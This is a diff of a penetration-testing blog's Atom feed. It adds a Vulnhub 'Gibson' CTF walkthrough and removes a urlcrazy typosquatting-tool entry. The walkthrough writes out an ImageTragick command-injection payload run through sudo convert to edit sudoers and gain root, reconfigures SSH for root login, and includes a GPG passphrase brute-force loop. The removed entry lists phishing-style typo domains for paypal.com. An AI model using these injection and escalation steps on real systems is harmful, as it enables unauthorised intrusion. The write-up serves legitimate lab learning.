@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-09-24T11:38:09-04:00</updated>
+  <updated>2017-10-28T16:36:45-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,520 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Gibson 0.2 walkthrough]]></title>
+    <link href="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/"/>
+    <updated>2017-10-28T16:10:23-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough</id>
+    <content type="html"><![CDATA[<p>The Vulnhub machine I picked for today&rsquo;s target is called Gibson. For this challenge, there are also some hints:</p>
+
+<ul>
+<li>SSH can forward X11.</li>
+<li>The challenge isn&rsquo;t over with root. The flag is not where you expect to find it.</li>
+</ul>
+
+
+<p>Let&rsquo;s see what Gibson has in store for us!</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<p><code>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
+|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
+|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| 273   2016-05-07 13:03  davinci.html
+|_
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Index of /
+</code></p>
+
+<p>Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:</p>
+
+<p>```</p>
+
+<!-- Damn it Margo! Stop setting your password to "god" -->
+
+
+<!-- at least try and use a different one of the 4 most -->
+
+
+<!-- common ones! (eugene) -->
+
+
+<p>```</p>
+
+<p>With this information in hand, I tried SSH'ing as Margo with password god. That didn&rsquo;t work, but doing it as margo instead got me in. We have a shell on the box already!</p>
+
+<h2>Privilege escalation</h2>
+
+<p>We&rsquo;re in as margo, but we need root. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_pricheck script</a> and sifted through the output to see what might be helpful. Some of the discoveries:</p>
+
+<ul>
+<li>there is a network interface connected to a different subnet:</li>
+</ul>
+
+
+<p>```
+virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb</p>
+
+<pre><code>      inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
+      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+      RX packets:7 errors:0 dropped:0 overruns:0 frame:0
+      TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
+      collisions:0 txqueuelen:0 
+      RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)
+</code></pre>
+
+<p>```</p>
+
+<ul>
+<li>VNC is running on the localhost:</li>
+</ul>
+
+
+<p><code>
+tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
+</code></p>
+
+<ul>
+<li>user marvo has some sudo privileges that need to be checked out:</li>
+</ul>
+
+
+<p>```
+User margo may run the following commands on gibson:</p>
+
+<pre><code>(ALL) NOPASSWD: /usr/bin/convert
+</code></pre>
+
+<p>```</p>
+
+<ul>
+<li>other users on the host are duke and eugene</li>
+</ul>
+
+
+<p>Alright, we have a solid start. First thing I did was check that convert binary:</p>
+
+<p>```
+margo@gibson:~$ /usr/bin/convert
+Version: ImageMagick 6.7.7-10 2014-03-06 Q16 <a href="http://www.imagemagick.org">http://www.imagemagick.org</a>
+Copyright: Copyright &copy; 1999-2012 ImageMagick Studio LLC
+Features: OpenMP</p>
+
+<p>Usage: convert [options &hellip;] file [ [options &hellip;] file &hellip;] [options &hellip;] file
+[&hellip;]
+```</p>
+
+<p>ImageMagick? More like <a href="https://www.exploit-db.com/exploits/39767/">ImageTragick</a>. This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.</p>
+
+<blockquote><p>Insufficient filtering for filename passed to delegate&rsquo;s command allows
+remote code execution during conversion of several file formats.</p>
+
+<p>ImageMagick allows to process files with external libraries. This
+feature is called &lsquo;delegate&rsquo;. It is implemented as a system() with command string (&lsquo;command&rsquo;)</p>
+
+<p>One of the default delegate&rsquo;s command is used to handle https requests:</p>
+
+<p>&ldquo;wget&rdquo; -q -O &ldquo;%o&rdquo; &ldquo;<a href="https:%M">https:%M</a>&rdquo;</p>
+
+<p>Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual
+link from the input. It is possible to pass the value like <code>https://example.com"|ls "-la</code> and
+execute unexpected &lsquo;ls -la&rsquo;. (wget or curl should be installed)</p></blockquote>
+
+<p>So, the injection would look like this:</p>
+
+<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"&rsquo; tragic.png</code></p>
+
+<p>And if the command takes arguments:</p>
+
+<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"-flags&rsquo; tragic.png</code></p>
+
+<p>Of course, you are not limited to the pipe character. You can also use <strong>;</strong>.</p>
+
+<p>Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing <strong>/etc/sudoers</strong>:</p>
+
+<p><code>
+margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png
+</code></p>
+
+<p>The sudoers file will pop up in vim, and I gave full access to margo:</p>
+
+<p>```</p>
+
+<h1>User privilege specification</h1>
+
+<p>root    ALL=(ALL:ALL) ALL</p>
+
+<p>margo    ALL=(ALL:ALL) ALL
+```</p>
+
+<p>Also, some other interesting tidbits in the the sudoers file:</p>
+
+<p>```</p>
+
+<h1>Allow members of group sudo to execute any command</h1>
+
+<h2>disabled after Margo&rsquo;s security incident</h2>
+
+<h2>%sudo ALL=(ALL:ALL) ALL</h2>
+
+<h1>Allow Margo to convert pictures from the FTP server</h1>
+
+<p>margo ALL=(ALL) NOPASSWD: /usr/bin/convert</p>
+
+<h1>Allow eugene to manage virtual machines and visudo</h1>
+
+<p>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
+eugene ALL=(ALL:ALL)  /usr/sbin/visudo
+```</p>
+
+<p>I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!</p>
+
+<p><code>
+convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
+convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
+convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
+margo@gibson:~$ sudo su
+[sudo] password for margo:
+root@gibson:/home/margo#
+</code></p>
+
+<p>From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the <strong>-X</strong> flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!</p>
+
+<p>```
+root@gibson:~# virsh list &mdash;all</p>
+
+<h2> Id    Name                           State</h2>
+
+<p> 2     ftpserv                        running
+```</p>
+
+<p>At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:</p>
+
+<p><code>
+ls /var/lib/libvirt/images/
+ftpserv.img
+</code></p>
+
+<p>To transfer the VM using scp, I first needed to enable SSH'ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:</p>
+
+<p>```
+PermitRootLogin yes
+AllowUsers eugene margo root
+Match user root</p>
+
+<pre><code>PasswordAuthentication yes
+</code></pre>
+
+<p>```</p>
+
+<p>Then I changed root&rsquo;s password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:</p>
+
+<p><code>
+scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
+Ubuntu 14.04.3 LTS
+root@192.168.217.148's password:
+ftpserv.img                                   100%  512MB  22.6MB/s   00:22    
+</code></p>
+
+<p>Let&rsquo;s see what we have here:</p>
+
+<p><code>
+file ftpserv.img
+ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
+</code></p>
+
+<p>To mount it, we need to learn the offset:</p>
+
+<p>```
+fdisk -l ftpserv.img
+Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x00000000</p>
+
+<p>Device       Boot Start     End Sectors   Size Id Type
+ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)
+```</p>
+
+<p>So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:</p>
+
+<p><code>
+root@kali:/mnt# mkdir ftpserv
+mount -o loop,offset=32256 ftpserv.img ftpserv
+</code></p>
+
+<p>Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let&rsquo;s look inside:</p>
+
+<p><code>
+ls ftpserv
+AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
+BOOTSECT.BIN  DOS          GARBAGE       net
+</code></p>
+
+<p>The GARBAGE directory seems interesting:</p>
+
+<p><code>
+ls GARBAGE/
+adminspo.jpg  flag.img  jz_ug.ans
+</code></p>
+
+<p>Let&rsquo;s see the picture first:</p>
+
+<p><img class="center" src="/images/pentest/gibson/adminspo.jpg" title="&lsquo;sysadmin&rsquo; &lsquo;sysadmin life&rsquo;" ></p>
+
+<p>I also ran exiftool on it and was rewarded with..something:</p>
+
+<p><code>
+exiftool adminspo.jpg
+ExifTool Version Number         : 10.60
+File Name                       : adminspo.jpg
+Directory                       : .
+File Size                       : 120 kB
+File Modification Date/Time     : 2016:05:04 17:17:44-04:00
+File Access Date/Time           : 2017:10:01 15:14:34-04:00
+File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
+File Permissions                : rwxr-xr-x
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
+Modify Date                     : 2016:05:04 22:29:32
+Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
+User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
+[...]
+</code></p>
+
+<p>Next I looked at the ANS file:</p>
+
+<p><code>
+file jz_ug.ans
+jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences
+</code></p>
+
+<p>Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:</p>
+
+<p>```
+cat jz_ug.ans</p>
+
+<p>   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����</p>
+
+<pre><code>�����������������������������������������������������۲���������������
+�������������������������۲���������� ��������۲�����۲���������������
+���������������������������������������������������� �����������������
+޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
+ ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
+                              �                            �         �
+                the ugliest of all are under 5 feet tall
+</code></pre>
+
+<p>```</p>
+
+<p>Hmm, ok. Finally, another image file:</p>
+
+<p><code>
+file flag.img
+flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
+</code></p>
+
+<p>This time it&rsquo;s an EXT2 filesystem. I mounted it:</p>
+
+<p><code>
+mount ftpserv/GARBAGE/flag.img flag
+ls -la
+total 70
+drwxr-xr-x 4 root root  1024 May 14  2016 .
+drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
+-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
+-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
+-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
+drwx------ 2 root root 12288 May  5  2016 lost+found
+drwxr-xr-x 2 root root  1024 May  5  2016 .trash
+</code></p>
+
+<p>Davinci is a snake game:</p>
+
+<p>```</p>
+
+<pre><code>        _________         _________             
+       /         \       /         \            
+      /  /~~~~~\  \     /  /~~~~~\  \           
+      |  |     |  |     |  |     |  |           
+      |  |     |  |     |  |     |  |           
+      |  |     |  |     |  |     |  |         / 
+      |  |     |  |     |  |     |  |       //  
+     (o  o)    \  \_____/  /     \  \_____/ /   
+      \__/      \         /       \        /    
+        |        ~~~~~~~~~         ~~~~~~~~         
+        ^                               
+        Welcome To The Snake Game!          
+                Press Any Key To Continue...    
+</code></pre>
+
+<p>```</p>
+
+<p>Its source code hints that it&rsquo;s vulnerable to buffer overflow if more than 128 characters are entered. Let&rsquo;s look at the hint now:</p>
+
+<p><code>
+cat hint.txt
+http://www.imdb.com/title/tt0117951/ and
+http://www.imdb.com/title/tt0113243/ have
+someone in common... Can you remember his
+original nom de plume in 1988...?
+</code></p>
+
+<p>The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It&rsquo;s a handle: Zero Cool.</p>
+
+<p>And finally, the hidden directory:</p>
+
+<p><code>
+ls -l
+total 317
+---x------ 1 root root    469 May 14  2016 flag.txt.gpg
+-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
+</code></p>
+
+<p>The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it&rsquo;s encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:</p>
+
+<p><code>
+cat tries.txt
+zero cool
+zerocool
+zero kool
+zerokool
+</code></p>
+
+<p>Next I used John to generate a file of uppercase and lowercase combinations from this initial file:</p>
+
+<p><code>
+john --rules=nt --wordlist=tries.txt --stdout &gt; pass.txt
+Created directory: /root/.john
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL
+</code></p>
+
+<p>And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:</p>
+
+<p><code>
+wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt
+</code></p>
+
+<p>Now add the rules to John&rsquo;s config file:</p>
+
+<p><code>
+cat korelogic-rules-20100801.txt &gt;&gt; /etc/john/john.conf
+</code></p>
+
+<p>Now I was able to generate the file with p@$$w0rd$:</p>
+
+<p><code>
+john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout &gt; coolpass.txt
+Press 'q' or Ctrl-C to abort, almost any other key for status
+132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1
+</code></p>
+
+<p>And a quick shell script for bruteforcing from the file:</p>
+
+<p>```
+for pass in $(cat coolpass.txt) ; do</p>
+
+<pre><code>echo "Trying:" $pass
+gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
+if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
+break
+fi
+</code></pre>
+
+<p>done
+```</p>
+
+<p>The correct passphrase is <strong>Z3r0K00l</strong></p>
+
+<p><code>
+Trying: Z3r0K00l
+gpg: CAST5 encrypted data
+[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
+gpg: encrypted with 1 passphrase
+[GNUPG:] BEGIN_DECRYPTION
+[GNUPG:] DECRYPTION_INFO 0 3
+[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
+[GNUPG:] PLAINTEXT_LENGTH 862
+[GNUPG:] DECRYPTION_OKAY
+gpg: WARNING: message was not integrity protected
+[GNUPG:] END_DECRYPTION
+Passphrase found! Z3r0K00l
+</code></p>
+
+<p>And the flag is:</p>
+
+<p>```
+cat flag.txt</p>
+
+<hr />
+
+<p>| | | | <strong> _  </strong><em>| | __ |</em>   <em>| |<strong>   </strong></em>   |  _ \| | <strong> _ _ </strong>   <strong><em>| |</em>| |
+| |<em>| |/ </em><code>|/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _</code> | &lsquo;_ \ / _ \ </strong>| |
+|  _  | (<em>| | (<strong>|   &lt;    | | | | | |  </strong>/  |  __/| | (</em>| | | | |  <strong>/ |<em>|</em>|
+|<em>| |</em>|_<em>,</em>|_</strong>|<em>|_\   |</em>| |<em>| |</em>|_<strong>|  |<em>|   |</em>|_<em>,</em>|<em>| |</em>|_</strong>|_<em>(</em>)</p>
+
+<p>Should you not be standing in a 360 degree rotating payphone when reading
+this flag&hellip;? B-)</p>
+
+<p>Anyhow, congratulations once more on rooting this VM. This time things were
+a bit esoteric, but I hope you enjoyed it all the same.</p>
+
+<p>Shout-outs again to #vulnhub for hosting a great learning tool. A special
+thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
+to host the CTF once more.</p>
+
+<pre><code>                                                          --Knightmare
+</code></pre>
+
+<p>```</p>
+
+<p><strong>Learn more</strong></p>
+
+<ul>
+<li><a href="https://imagetragick.com/">ImageTragick</a></li>
+</ul>
+
+
+<p>```</p>
+
+<hr />
+
+<p>/ Q: Why is Christmas just like a day at \
+| the office? A: You do all of the work  |
+| and the fat guy in the suit            |
+|                                        |
+\ gets all the credit.                   /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[sslyze - Kali Linux tools]]></title>
@@ -1500,283 +2014,6 @@ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</p>
 | master stays out                        |
 |                                         |
 \ of the way.                             /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[urlcrazy - Kali Linux tools]]></title>
-    <link href="http://chousensha.github.io/blog/2017/07/05/urlcrazy-kali-linux-tools/"/>
-    <updated>2017-07-05T06:44:07-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/07/05/urlcrazy-kali-linux-tools</id>
-    <content type="html"><![CDATA[<p><strong>Objective</strong> you want to detect possible URL hijacking or phishing of a domain, where unsuspecting users are lured to a malicious domain that is very similar to the original one. urlcrazy ftw!</p>
-
-<p>Homepage: <a href="https://www.morningstarsecurity.com/research/urlcrazy">https://www.morningstarsecurity.com/research/urlcrazy</a></p>
-
-<!-- more -->
-
-
-<p></p>
-
-<h2>urlcrazy description</h2>
-
-<blockquote><p>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
-phishing, and corporate espionage.</p>
-
-<p>Usage</p>
-
-<p>Detect typo squatters profiting from typos on your domain name</p>
-
-<p>Protect your brand by registering popular typos</p>
-
-<p>Identify typo domain names that will receive traffic intended for another domain</p>
-
-<p>Conduct phishing attacks during a penetration test</p>
-
-<p>Features</p>
-
-<p>Generates 15 types of domain variants</p>
-
-<p>Knows over 8000 common misspellings</p>
-
-<p>Supports cosmic ray induced bit flipping</p>
-
-<p>Multiple keyboard layouts (qwerty, azerty, qwertz, dvorak)</p>
-
-<p>Checks if a domain variant is valid</p>
-
-<p>Test if domain variants are in use</p>
-
-<p>Estimate popularity of a domain variant URLCrazy requires Linux and the Ruby interpreter.</p></blockquote>
-
-<h2>urlcrazy options</h2>
-
-<p>```
-urlcrazy -h
-URLCrazy version 0.5
-by Andrew Horton (urbanadventurer)
-<a href="http://www.morningstarsecurity.com/research/urlcrazy">http://www.morningstarsecurity.com/research/urlcrazy</a></p>
-
-<p>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
-phishing, and corporate espionage.</p>
-
-<p>Supports the following domain variations:
-Character omission, character repeat, adjacent character swap, adjacent character replacement, double
-character replacement, adjacent character insertion, missing dot, strip dashes, singular or pluralise,
-common misspellings, vowel swaps, homophones, bit flipping (cosmic rays), homoglyphs, wrong top level
-domain, and wrong second level domain.</p>
-
-<p>Usage: /usr/bin/urlcrazy [options] domain</p>
-
-<p>Options
- -k, &mdash;keyboard=LAYOUT  Options are: qwerty, azerty, qwertz, dvorak (default: qwerty)
- -p, &mdash;popularity   Check domain popularity with Google
- -r, &mdash;no-resolve   Do not resolve DNS
- -i, &mdash;show-invalid Show invalid domain names
- -f, &mdash;format=TYPE  Human readable or CSV (default: human readable)
- -o, &mdash;output=FILE  Output file
- -h, &mdash;help     This help
- -v, &mdash;version      Print version information. This version is 0.5
-```</p>
-
-<h2>urlcrazy usage</h2>
-
-<p>```
-urlcrazy kali.org
-/usr/share/urlcrazy/tld.rb:81: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 81
-/usr/share/urlcrazy/tld.rb:89: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 89
-/usr/share/urlcrazy/tld.rb:91: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 91
-URLCrazy Domain Report
-Domain    : kali.org
-Keyboard  : qwerty
-At        : 2017-07-05 06:57:50 -0400</p>
-
-<h1>Please wait. 63 hostnames to process</h1>
-
-<h2>Typo Type              Typo         DNS-A            CC-A               DNS-MX                                Extn  </h2>
-
-<p>Character Omission     kai.org      111.89.129.15    JP,JAPAN           kai.org                               org <br/>
-Character Omission     kal.org      69.172.201.153   US,UNITED STATES                                         org <br/>
-Character Omission     kli.org      208.97.188.67    US,UNITED STATES   vade-in2.mail.dreamhost.com           org <br/>
-Character Repeat       kaali.org    184.168.221.56   US,UNITED STATES   mailstore1.secureserver.net           org <br/>
-Character Repeat       kalii.org                     ?                                                        org <br/>
-Character Repeat       kalli.org                     ?                  mail.joker.com                        org <br/>
-Character Repeat       kkali.org                     ?                                                        org <br/>
-Character Swap         akli.org     180.240.134.81   SG,SINGAPORE       mail.akli.org                         org <br/>
-Character Swap         kail.org     185.53.178.9                        mail.h-email.net                      org <br/>
-Character Swap         klai.org     74.208.59.167    US,UNITED STATES   mx01.1and1.com                        org <br/>
-Character Replacement  jali.org                      ?                  mailin1.totalweb.net.uk               org <br/>
-Character Replacement  kaki.org                      ?                                                        org <br/>
-Character Replacement  kalo.org     54.214.44.86     US,UNITED STATES   aspmx5.googlemail.com                 org <br/>
-Character Replacement  kalu.org     64.85.171.16     US,UNITED STATES   host.rack-host.net                    org <br/>
-Character Replacement  ksli.org     203.184.176.168  HK,HONG KONG                                             org <br/>
-Character Replacement  lali.org     194.232.43.3     AT,AUSTRIA         dedi3762.your-server.de               org <br/>
-Character Insertion    kalio.org    213.186.33.87    FR,FRANCE          mx2.ovh.net                           org <br/>
-Character Insertion    kaliu.org    67.205.40.20     US,UNITED STATES   vade-in1.mail.dreamhost.com           org <br/>
-Character Insertion    kalki.org    97.74.42.79      US,UNITED STATES   smtp.secureserver.net                 org <br/>
-Character Insertion    kasli.org    217.112.35.116   GB,UNITED KINGDOM  mx25.valuehost.ru                     org <br/>
-Character Insertion    kjali.org                     ?                                                        org <br/>
-Character Insertion    klali.org                     ?                                                        org <br/>
-Missing Dot            kaliorg.com                   ?                                                        com <br/>
-Missing Dot            wwwkali.org                   ?                                                        org <br/>
-Singular or Pluralise  kalis.org    217.160.233.111  DE,GERMANY         mx00.kundenserver.de                  org <br/>
-Vowel Swap             kala.org     64.111.125.111   US,UNITED STATES   ASPMX2.GOOGLEMAIL.COM                 org <br/>
-Vowel Swap             kale.org     185.53.178.9                        mail.h-email.net                      org <br/>
-Vowel Swap             keli.org                      ?                  mail.hti.ag                           org <br/>
-Vowel Swap             kili.org     69.172.201.153   US,UNITED STATES                                         org <br/>
-Vowel Swap             koli.org     72.52.4.122      US,UNITED STATES   localhost                             org <br/>
-Vowel Swap             kuli.org     37.120.172.191   JP,JAPAN           v2.v1.biz                             org <br/>
-Homophones             kalaye.org                    ?                                                        org <br/>
-Homophones             kaleye.org                    ?                                                        org <br/>
-Bit Flipping           cali.org     23.21.169.243    US,UNITED STATES   alt1.aspmx.l.google.com               org <br/>
-Bit Flipping           iali.org                      ?                                                        org <br/>
-Bit Flipping           kadi.org     146.148.34.125   US,UNITED STATES   mail.hope-mail.com                    org <br/>
-Bit Flipping           kahi.org     206.126.4.4      պ,                kahi-org.mail.protection.outlook.com  org <br/>
-Bit Flipping           kalh.org     50.63.33.1       E�,                mailstore1.secureserver.net           org <br/>
-Bit Flipping           kalk.org     137.74.127.233                                                            org <br/>
-Bit Flipping           kalm.org                      ?                  mx.kalm.org.cust.a.hostedemail.com    org <br/>
-Bit Flipping           kaly.org     207.148.248.143  US,UNITED STATES                                         org <br/>
-Bit Flipping           kami.org     69.172.201.153   ��,                                                      org <br/>
-Bit Flipping           kani.org     178.33.20.67     FR,FRANCE          mail.kani.org                         org <br/>
-Bit Flipping           kcli.org     50.63.202.44     US,UNITED STATES   ALT1.ASPMX.L.GOOGLE.COM               org <br/>
-Bit Flipping           kqli.org                      ?                                                        org <br/>
-Bit Flipping           oali.org     184.107.215.202  CA,CANADA          oali.org                              org <br/>
-Homoglyphs             ka1i.org                      ?                                                        org <br/>
-Homoglyphs             kall.org     65.254.238.128   US,UNITED STATES   mx.kall.org                           org <br/>
-Wrong TLD              kali.ca      76.74.246.51     US,UNITED STATES   kali.ca                               ca  <br/>
-Wrong TLD              kali.ch      81.221.254.5     CH,SWITZERLAND     kali.ch.2.arsmtp.com                  ch  <br/>
-Wrong TLD              kali.com     75.164.208.82    US,UNITED STATES   alt2.aspmx.l.google.com               com <br/>
-Wrong TLD              kali.de      193.238.9.165    DE,GERMANY                                               de  <br/>
-Wrong TLD              kali.edu                      ?                                                        edu <br/>
-Wrong TLD              kali.es      212.227.247.181  DE,GERMANY         mx01.1and1.es                         es  <br/>
-Wrong TLD              kali.fr      103.224.182.248                     mx92.mb5p.com                         fr  <br/>
-Wrong TLD              kali.it      195.110.124.188  IT,ITALY           mail.register.it                      it  <br/>
-Wrong TLD              kali.jp      8.6.19.68        US,UNITED STATES   smtp.secureserver.net                 jp  <br/>
-Wrong TLD              kali.net     45.40.165.16                        ASPMX.L.GOOGLE.COM                    net <br/>
-Wrong TLD              kali.nl      72.52.4.121      US,UNITED STATES   localhost                             nl  <br/>
-Wrong TLD              kali.no      194.63.248.52    NO,NORWAY          mx02.domeneshop.no                    no  <br/>
-Wrong TLD              kali.ru      185.53.179.40                                                             ru  <br/>
-Wrong TLD              kali.se      92.42.73.20      SE,SWEDEN          kali-se.mail.protection.outlook.com   se  <br/>
-Wrong TLD              kali.us      184.168.221.28   US,UNITED STATES   209.150.186.51                        us <br/>
-```</p>
-
-<ul>
-<li>check domain popularity with no DNS resolution</li>
-</ul>
-
-
-<p>```
-urlcrazy -p -r paypal.com
-/usr/share/urlcrazy/tld.rb:81: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 81
-/usr/share/urlcrazy/tld.rb:89: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 89
-/usr/share/urlcrazy/tld.rb:91: warning: key &ldquo;2nd_level_registration&rdquo; is duplicated and overwritten on line 91
-URLCrazy Domain Report
-Domain    : paypal.com
-Keyboard  : qwerty
-At        : 2017-07-05 07:01:52 -0400</p>
-
-<h1>Please wait. 80 hostnames to process</h1>
-
-<h2>Typo Type              Typo           Pop  CC-A  Extn  </h2>
-
-<p>Character Omission     papal.com           ?     com <br/>
-Character Omission     payal.com           ?     com <br/>
-Character Omission     paypa.com           ?     com <br/>
-Character Omission     paypal.cm           ?     cm  <br/>
-Character Omission     paypl.com           ?     com <br/>
-Character Omission     pypal.com           ?     com <br/>
-Character Repeat       paaypal.com         ?     com <br/>
-Character Repeat       paypaal.com         ?     com <br/>
-Character Repeat       paypall.com         ?     com <br/>
-Character Repeat       payppal.com         ?     com <br/>
-Character Repeat       payypal.com         ?     com <br/>
-Character Repeat       ppaypal.com         ?     com <br/>
-Character Swap         apypal.com          ?     com <br/>
-Character Swap         papyal.com          ?     com <br/>
-Character Swap         payapl.com          ?     com <br/>
-Character Swap         paypla.com          ?     com <br/>
-Character Swap         pyapal.com          ?     com <br/>
-Character Replacement  oaypal.com          ?     com <br/>
-Character Replacement  patpal.com          ?     com <br/>
-Character Replacement  paupal.com          ?     com <br/>
-Character Replacement  payoal.com          ?     com <br/>
-Character Replacement  paypak.com          ?     com <br/>
-Character Replacement  paypsl.com          ?     com <br/>
-Character Replacement  psypal.com          ?     com <br/>
-Character Insertion    pasypal.com         ?     com <br/>
-Character Insertion    paypalk.com         ?     com <br/>
-Character Insertion    paypasl.com         ?     com <br/>
-Character Insertion    paypoal.com         ?     com <br/>
-Character Insertion    paytpal.com         ?     com <br/>
-Character Insertion    payupal.com         ?     com <br/>
-Character Insertion    poaypal.com         ?     com <br/>
